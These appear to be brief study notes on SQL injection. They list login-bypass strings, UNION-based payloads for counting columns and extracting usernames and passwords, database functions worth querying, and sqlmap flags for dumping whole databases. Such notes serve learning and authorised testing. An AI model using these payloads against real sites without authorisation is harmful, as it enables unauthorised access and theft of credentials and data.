# SQL injection and SQL Map

SQL commands: SELECT, FROM, WHERE, UNION

1=1 means True

Useful comments: --+ // /*

Login bypass: ' or true --
              ') or true-

Using UNION: ' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- ... until an error occurs
             ' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL-- ... until error
             ' UNION SELECT username, password FROM users -- this one selects the username and pasword columns from the da             tabase

Examples what should you looking for: 
    database()
    user()
    @@version
    username
    password
    table_name
    column_name

SQL Map:
Command 	
--url 	    Provide URL for the attack
--dbms 	    Tell SQLMap the type of database that is running
--dump 	    Dump the data within the database that the application uses
--dump-all 	Dump the ENTIRE database
--batch 	SQLMap will run automatically and won't ask for user input
--tables
--columns

Cheat sheet: https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
